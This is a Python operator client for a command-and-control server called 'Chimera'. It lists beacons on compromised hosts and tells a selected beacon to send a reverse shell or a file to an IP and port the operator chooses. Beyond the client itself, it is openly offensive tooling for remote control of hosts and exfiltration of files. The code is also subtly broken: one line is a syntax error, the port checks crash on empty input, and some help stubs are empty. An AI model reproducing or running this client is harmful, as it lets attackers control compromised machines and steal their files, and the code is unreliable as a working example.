import socket
import sys

def runInteractive(SERVER):
    if (SERVER == ""):
        x = True
        while x:
            enteredAddress = input("Enter server address: ")
            if (len(enteredAddress.split('.')) == 4):
                x = False
                SERVER = enteredAddress
            else:
                print("Invalid address entered. Please enter the IPv4 address of the Chimera server.")
    if not checkConn(SERVER):
        print(f"Unable to reach server at {SERVER}, connection failure or timeout.")
        connected = False
    else:
        print(f"Successfully reached Chimera server at {SERVER}")
        connected = True
    
    if not connected:
        return
    
    z = True
    
    while z:
        command = input("Enter command: ")
        if (command == "exit"):
            z = False
        elif (command == "list"):
            printBeaconList(SERVER)
        elif (command == "select"):
            printBeaconList(SERVER)
            beacons = getBeaconList(SERVER)
            selection = ""
            while selection not in beacons:
                selection = input("Select a beacon IP: ")
                if selection not in beacons:
                    print("Invalid selection. Please select a valid beacon IP.")
            print(f"Selected Beacon: {selection}")
            entered = input("Enter command: ")
            if (entered == "shell"):
                ip = ""
                while not (len(ip.split('.')) == 4):
                    ip = input("Enter IP to send shell to: ")
                    if not (len(ip.split('.')) == 4):
                        print("Invalid IPv4 address entered.")
                port = ""
                while not ((int(port) > 0) and (int(port) <= 510)):
                    port = input("Enter port to send shell to (1-510): ")
                    if not ((int(port) > 0) and (int(port) <= 510)):
                        print("Invalid port entered. Valid port range is 1-510.")
                packet = "shell:" + ip + ":" + port + ":" + selection
                try:
                    sock.sendto(packet.encode(),(SERVER, 10000))
                except socket.timeout:
                    print("Socket timeout. Server may be down or otherwise unresponsive.")
                try:
                    resp, _ = sock.recvfrom(512)
                except socket.timeout:
                    print("Socket timeout. Server may be down or otherwise unresponsive.")
                if not (resp.decode() == "confirm"):
                    print("Server error. Action not performed.")
            elif (entered == "file"):
                filePath = ""
                while not (len(filePath) > 0):
                    filePath = input("Enter file path: ")
                    if not (len(filePath) > 0):
                        print("Invalid file path.")
                ip = ""
                while not (len(ip.split('.')) == 4):
                    ip = input("Enter IP to send shell to: ")
                    if not (len(ip.split('.')) == 4):
                        print("Invalid IPv4 address entered.")
                port = ""
                while not ((int(port) > 0) and (int(port) <= 510)):
                    port = input("Enter port to send shell to (1-510): ")
                    if not ((int(port) > 0) and (int(port) <= 510)):
                        print("Invalid port entered. Valid port range is 1-510.")
                packet = "file:" + filePath + ":" + ip + ":" + port + ":" + selection
                try:
                    sock.sendto(packet.encode(),(SERVER, 10000))
                except socket.timeout:
                    print("Socket timeout. Server may be down or otherwise unresponsive.")
                try:
                    resp, _ = sock.recvfrom(512)
                except socket.timeout:
                    print("Socket timeout. Server may be down or otherwise unresponsive.")
                if not (resp.decode() == "confirm"):
                    print("Server error. Action not performed.")
            else:
                printBeaconHelp()
        else:
            printCommHelp()

def runStandard():
    pass

def formSocket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    return sock

def checkConn(SERVER):
    sock.sendto("check".encode(),(SERVER, 10000))
    try:
        resp, _ = sock.recvfrom(512)
    except socket.timeout:
        return False
    if (resp.decode() == "confirm"):
        return True
    else:
        return False
        
def printBeaconList(SERVER):
    timeout = False
    sock.sendto("status".encode(),(SERVER, 10000))
    try:
        resp, _ = sock.recvfrom(512)
    except socket.timeout:
        print("Socket timeout. Server may be down or otherwise unresponsive.")
        timeout = True
    if not timeout:
        response = resp.decode()
        beaconList = response.split(';')
        print("Beacon IP ||| Last Heard From")
        print("----------------------------------")
        for beacon in beaconList:
            beacon = beacon.split('|')
            print(beacon[0] + " -- " + beacon[1])
        print("")
        
def getBeaconList(SERVER):
    beacons []
    timeout = False
    sock.sendto("status".encode(),(SERVER, 10000))
    try:
        resp, _ = sock.recvfrom(512)
    except socket.timeout:
        timeout = True
    if not timeout:
        response = resp.decode()
        beaconList = response.split(';')
        for beacon in beaconList:
            beacon = beacon.split('|')
            beacons.append(beacon[0])
    return beacons

def printHelp():
    print("""
    
    
    
    
    
    
""")

def printCommHelp():
    print("""
    Chimera server commands
---------------------------------

exit - exits out of the client
list - collects a list of all beacons registered to the server, along with their last-heard-from date/time
select - displays a list of beacons then prompts to select a beacon to interact with
    
    
""")
    
def printBeaconHelp():
    print("""
    Chimera beacon commands
---------------------------------

shell - prompts for IP/port to send a reverse shell to

""")

sock = formSocket()
if (len(sys.argv) == 1):
    runInteractive("")
elif (len(sys.argv) == 2):
    if not (len(sys.argv[1].split('.')) == 4):
        print("Invalid IP address. Note: This will only accept IPv4 addresses.")
    else:
        SERVER = sys.argv[1]
        runInteractive(SERVER)
else:
    printHelp()
